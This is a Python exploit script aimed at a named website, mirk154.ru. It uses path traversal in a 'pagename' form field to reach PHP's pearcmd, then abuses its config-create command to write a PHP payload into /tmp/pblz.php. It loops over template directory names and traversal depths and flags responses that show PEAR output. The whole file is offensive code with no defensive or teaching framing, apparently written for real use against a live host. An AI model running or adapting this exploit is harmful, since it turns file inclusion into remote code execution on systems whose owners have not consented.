import re
from core import vuln

h = "mirk154.ru"
base = "https://" + h
CT = "application/x-www-form-urlencoded"
pid = 4430
payload = "<?=" + vuln._chrlit("PBLX") + "?>"

def post(pname, query=""):
    body = ("page_id=%d&pagename=%s" % (pid, vuln._denc(pname))).encode()
    return vuln._req("POST", base + "/" + query, body=body, ctype=CT)

for td in ["page-templates", "page-template", "page-templates-full-width", "templates",
           "page", "page-full", "page-tpl", "page-templates-2col", "page-blank"]:
    pre = td[5:] if td.startswith("page-") else td
    for d in (3, 4, 5, 6, 7):
        p = pre + "/" + "../" * d + "usr/local/lib/php/pearcmd"
        try:
            r = post(p, "?+config-create+/" + payload + "+/tmp/pblz.php")
        except Exception as e:
            print(td, d, "EXC", type(e).__name__); continue
        t = r.text or ""
        hit = [w for w in ("PEAR_", "Commands:", "config-create", "Warning") if w in t]
        if hit:
            print("HIT", td, d, r.status_code, len(t), hit)